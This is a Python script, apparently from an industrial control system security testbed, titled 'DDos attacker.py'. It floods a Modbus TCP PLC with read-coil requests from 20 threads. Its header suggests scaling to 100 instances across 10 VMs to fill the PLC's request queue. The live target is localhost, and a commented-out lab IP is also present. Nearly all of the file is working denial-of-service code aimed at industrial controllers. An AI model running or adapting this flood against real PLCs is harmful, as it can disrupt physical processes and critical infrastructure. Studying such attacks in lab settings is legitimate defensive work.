#-----------------------------------------------------------------------------
# Name:        DDos attacker.py
#
# Purpose:     A simple PLC request sender program try to full fill the target PLC's 
#              request handling queue. This program need to be run on multiple machine
#              with multiple thread. for example run 100 this program parallel 
#              on 10 vms.
#
# Author:      Yuancheng Liu
#
# Created:     2023/10/02
# Version:     v_0.1
# Copyright:   
# License:     
#-----------------------------------------------------------------------------

import time
import threading
from pyModbusTCP.client import ModbusClient

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class attackThread(threading.Thread):

    def __init__(self, parent,threadID, hostIP, hostPort, repeatTime=None) -> None:
        threading.Thread.__init__(self)
        self.parent = parent
        self.threadID = threadID
        self.hostIp = hostIP
        self.hostPort = hostPort
        self.repeatTime= repeatTime
        self.client = ModbusClient(host=self.hostIp, port=self.hostPort , auto_open=True)

#-----------------------------------------------------------------------------
    def run(self):
        print('Attack Thread %s : start DDoS attack' %str(self.threadID))
        reuslt = None
        if self.repeatTime is None:
            while True:
                timeVal = time.time()
                for i in range(1000):
                    reuslt = self.client.read_coils(0, 4)
                timeInt = time.time() - timeVal
                print("Attack Thread %s request sending frequency: %s /sec" %(str(self.threadID), 
                                                                              str(int(1000/timeInt))))
            if not reuslt: print("connection rejected")
        else:
            for i in range(self.repeatTime):
                timeVal = time.time()
                for i in range(1000):
                    reuslt = self.client.read_coils(0, 4)
                timeInt = time.time() - timeVal
                print("Attack Thread %s request sending frequency: %s /sec" %(str(self.threadID), 
                                                                              str(int(1000/timeInt))))
            if not reuslt: print("connection rejected")
        self.client.close()

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
def main():
    #hostIp = '10.107.105.7'
    #hostPort = 502
    hostIp = '127.0.0.1'
    hostPort = 504

    print('Try to connect to the target victim PLC: %s' % str(hostIp))
    threadPoolCount = 20
    threadPool = []
    for i in range(threadPoolCount):
        attackTh = attackThread(None, i, hostIp, hostPort, repeatTime=10)
        threadPool.append(attackTh)
    print("Start DDoS attacker")
    for attackTh in threadPool:
        attackTh.start()

#-----------------------------------------------------------------------------
if __name__ == '__main__':
    main()


